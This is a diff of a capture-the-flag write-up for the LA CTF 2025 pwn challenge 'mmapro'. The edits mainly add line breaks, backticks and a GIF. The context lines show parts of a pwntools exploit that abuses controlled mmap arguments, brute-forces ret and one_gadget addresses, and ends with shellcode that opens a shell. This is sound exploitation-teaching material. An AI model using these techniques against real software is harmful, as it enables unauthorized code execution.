@@ -29,6 +29,7 @@ excerpt: mmapro is a pwn challenge from LA CTF 2025, I haven't solved it but I g
 ```js
 0 -> 'pipe:[460074]'
 ```
+ <br>
 
 - **If Standard Input Is a Terminal or Pipe:**
 Terminals or pipes typically do not support memory mapping in the way regular files do. In that case, mmap() is likely to fail (returning MAP_FAILED) because the underlying device doesn’t allow the random-access behavior required for mmap().
@@ -49,6 +50,7 @@ void *mmap(void addr[.length],
            off_t offset
 );
 ```
+ <br>
 
 - Check the above code for reference, incase you forgot the syntax like me 🙂 
 - The only advantage is we can controll all these six args.
@@ -88,6 +90,7 @@ input('> attach GDB')
 p.sendline(payload)
 p.interactive()
 ```
+ <br>
 
 - This is a template script, so we can work on this in future.
 
@@ -106,13 +109,14 @@ p.interactive()
 
 > b *main+142
 ```
+ <br>
 
 - Set breakpoint in main+142, that's where our mmap begins
 
 ![image](https://hackmd.io/_uploads/SyST9mtK1x.png) <br>
 
 - addr=0, so the program will decide the memory location
-- length = 4096 bytes, it's rwx, flags = MAP_ANONYMOUS|MAP_PRIVATE
+- length = 4096 bytes, it's rwx, flags = `MAP_ANONYMOUS|MAP_PRIVATE`
 - Since it's anonymous it doesn't require FD, so fd= -1 and offset is 0
 - Everything is set, and we got `*RAX = 0x7f17316ac000` after syscall; 
 - So our syscall did not fail
@@ -164,6 +168,8 @@ flags  = 0x32 #  MMAP_FLAGS['MAP_FIXED'] | MMAP_FLAGS['MAP_ANONYMOUS'] | MMAP_FL
 fd     = -1
 offset = 0
 ```
+ <br>
+ 
 - I subtracted `0xf37` from `__GI___mmap64+23` addr, since the page need to be 0x1000 aligned!!
 
 ![image](https://hackmd.io/_uploads/SJnfdNYY1g.png) <br>
@@ -258,6 +264,7 @@ for line in disasm.split("\n"):
 print(colored('-'*80,'magenta',attrs=["bold"]))
 
 ```
+ <br>
 
 ![](https://i.imgur.com/rZJQRbn.png) <br>
 
@@ -354,6 +361,7 @@ crash_30.txt:rip = 0x74dcf4d3300a
 crash_72.txt:rip = 0x75022935cfff
 crash_25.txt:rip = 0x7cc017f2e002
 ```
+ <br>
 
 - One simple way is to check the RIP register from all crashes
 - In `crash_87.txt`, the RIP is 0x32, which is very rare 🤔 
@@ -425,6 +433,7 @@ MMAP_FLAGS = {
     "MAP_DENYWRITE": 0x08000
 }
 ```
+ <br>
 
 - But we can't do it easily, because the flag values might match a valid flag, otherwise it fails
 - I wrote a small python script to check the available flag values in a given address
@@ -457,6 +466,7 @@ def decode_flags(flag_value):
 flag_value = 0x76d44444e899
 print(f"Flags set in {hex(flag_value)}: {decode_flags(flag_value)}")
 ```
+ <br>
 
 - Let's try all the one_gadget address using the above script
 
@@ -507,7 +517,8 @@ for gadget_addr in one_gadgets:
     p.sendline(payload)
     p.interactive()
 ```
-
+ <br>
+ 
 - Nothing worked 🤔 
 - Ok, we can still jump to one gadget, since we have control over stack, the next address in the stack is also controllable by us => fd, currently it's `-1`, and it's not required since we are mapping an anonymous page
 - So let's plan to put a `ret` gadget address value in `flags` instead of directly putting the `one_gadget`'s address
@@ -554,6 +565,7 @@ if (rip_val == 0xffffffffffffffff):
     open('suitable_ret_offset.txt','a').write(sys.argv[1]+'\n')
 p.interactive()
 ```
+ <br>
 
 - And placed `-1` in fd, so we can check our ret gadget is working or not, if it works then the RIP register will have `0xffffffffffffffff`, and that ret gadget value satisfies the required flag values to make the mmap syscall success.
 - I got many valid ret gadgets, here are few of them
@@ -566,6 +578,7 @@ p.interactive()
 0x3b032
 0x3c0f2
 ```
+ <br>
 
 - Then I used my bruteforce script again to make my onegadget plan work. but not even a single gadget worked 🙂 
 
@@ -586,6 +599,8 @@ p.interactive()
 
 - And we got our shell 😌 
 
+![](https://raw.githubusercontent.com/jopraveen/jopraveen/main/some-gifs/cat-cute.gif)
+<br>
 
 ### **Final Script:**
 
@@ -635,3 +650,5 @@ p.sendline(shellcode)
 p.sendline('id')
 p.interactive()
 ```
+
+
